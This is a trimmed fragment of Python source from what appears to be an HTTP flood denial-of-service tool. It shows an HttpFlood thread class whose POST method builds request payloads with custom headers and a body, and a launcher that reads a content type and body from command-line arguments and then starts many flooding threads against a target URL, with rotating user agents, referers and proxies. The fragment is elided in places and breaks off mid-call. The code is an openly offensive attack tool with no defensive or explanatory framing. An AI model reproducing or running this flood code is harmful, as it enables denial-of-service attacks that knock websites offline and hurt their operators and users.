...
class HttpFlood(Thread):
    ...
    def POST(self) -> None:
        if self._ctype is not None and self._body is not None:
            payload: bytes = self.generate_payload(
                (f"Content-Length: {len(self._body)}\r\n"
                 "X-Requested-With: XMLHttpRequest\r\n"
                 f"Content-Type: {self._ctype}\r\n\r\n"
                 f"{self._body}"))[:-2]
            s = None
    ...
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            ...
            if method in Methods.LAYER7_METHODS:
                ...
                body = ''
                if method == "POST":
                    if argv[9] is not None and argv[10] is not None:
                        ctype = str(argv[9])
                        body = str(argv[10])
                ...
                for thread_id in range(threads):
                    if ctype != '' and body != '':
                        HttpFlood(thread_id, url, host, method, rpc, event,
                                uagents, referers, proxies,ctype,body).start()
                    else:
                        HttpFlood(thread_id, url, host, method, rpc, event,
